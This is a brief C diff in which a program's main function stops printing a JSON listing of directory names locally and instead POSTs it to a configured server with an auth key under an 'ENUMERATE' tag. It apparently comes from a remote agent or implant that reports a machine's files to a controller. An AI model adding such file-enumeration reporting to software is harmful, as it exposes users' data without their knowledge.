@@ -214,7 +214,10 @@ int main()
 
     int json_length;
     char* json_str = spill_file_json(dir_names, size, &json_length);
-    print_mem(json_str, json_length, TRUE);
+    // print_mem(json_str, json_length, TRUE);
+
+    // Send it to the server
+    send_post_request(SVL_ADDRESS, json_str, json_length, "ENUMERATE", SVL_AUTHKEY);
 
     dealloc_str_arr(dir_names, size);
     free(json_str);
